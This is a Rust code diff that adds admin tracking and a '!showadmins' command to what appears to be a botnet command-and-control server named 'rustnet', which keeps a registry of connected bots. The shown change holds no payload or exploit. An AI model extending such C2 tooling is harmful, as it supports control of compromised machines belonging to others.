@@ -7,7 +7,7 @@ use std::io::{ BufRead, BufReader, Read, Write};
 use lazy_static::lazy_static;
 use std::sync::{Arc, Mutex};
 
-use crate::common::{BOT_COUNT, BOT_REGISTRY};
+use crate::common::{BOT_COUNT, BOT_REGISTRY, ADMIN_REGISTRY};
 use crate::common::ADMIN_COUNT;
 
 
@@ -31,6 +31,7 @@ lazy_static! {
         m.insert("!botcount".to_string(), Box::new(BotCountCommand) as Box<dyn CommandHandler + Send>);
         m.insert("!admincount".to_string(), Box::new(AdminCountCommand) as Box<dyn CommandHandler + Send>);
         m.insert("!showbots".to_string(), Box::new(ShowBotsCommand) as Box<dyn CommandHandler + Send>);
+        m.insert("!showadmins".to_string(), Box::new(ShowAdminsCommand) as Box<dyn CommandHandler + Send>);
         Arc::new(Mutex::new(m))
     };
 }
@@ -69,6 +70,46 @@ impl CommandHandler for ShowBotsCommand {
         }
     }
 }
+struct ShowAdminsCommand;
+impl CommandHandler for ShowAdminsCommand {
+    fn handle(&self, stream: &mut TcpStream, _args: &[String]) {
+
+        let registry = ADMIN_REGISTRY.lock().unwrap();
+        if registry.is_empty() {
+            stream.write_all("No Admins connected.\n".as_bytes()).expect("Failed to write to stream");
+        } else {
+            stream.write_all("Connected Admins: \n".as_bytes()).expect("Failed to write to stream");
+            for bot_id in registry.keys() {
+                let bot_line = format!("-: {}\n", bot_id);
+                stream.write_all(bot_line.as_bytes()).expect("Failed to write to stream");
+            }
+        }
+    }
+}
+
+pub fn add_admin(admin_id: String, stream: TcpStream) {
+    let stream = Arc::new(Mutex::new(stream));
+    {
+        let mut registry = ADMIN_REGISTRY.lock().unwrap();
+        registry.insert(admin_id, stream);
+    }
+    {
+        let mut count = ADMIN_COUNT.lock().unwrap();
+        *count += 1;
+    }
+}
+
+pub fn remove_admin(admin_id: &str) {
+    {
+        let mut registry = ADMIN_REGISTRY.lock().unwrap();
+        registry.remove(admin_id);
+    }
+    {
+        let mut count = ADMIN_COUNT.lock().unwrap();
+        *count -= 1;
+    }
+}
+
 
 pub fn load_credentials() -> HashMap<String, String> {
     let file = File::open("admin.txt").expect("Unable to open file");
@@ -115,10 +156,8 @@ pub fn handle_connection(mut stream: TcpStream, credentials: HashMap<String, Str
 
 fn handle_authenticated_session(mut stream: TcpStream, username: &str) {
     println!("{} has joined!", username);
-    {
-        let mut count = ADMIN_COUNT.lock().unwrap();
-        *count += 1;
-    }
+    let admin_addr = stream.peer_addr().unwrap().to_string();
+    add_admin(admin_addr.clone(), stream.try_clone().expect("Failed to clone TcpStream"));
 
     stream.write_all(MOTD.as_bytes()).unwrap();
     stream.write_all(b"rustnet> ").unwrap();
@@ -136,10 +175,7 @@ fn handle_authenticated_session(mut stream: TcpStream, username: &str) {
         };
         if size == 0 {
             println!("{} has disconnected", username);
-            {
-                let mut count = ADMIN_COUNT.lock().unwrap();
-                *count -= 1;
-            }
+            remove_admin(&admin_addr);
             break;
         }
         
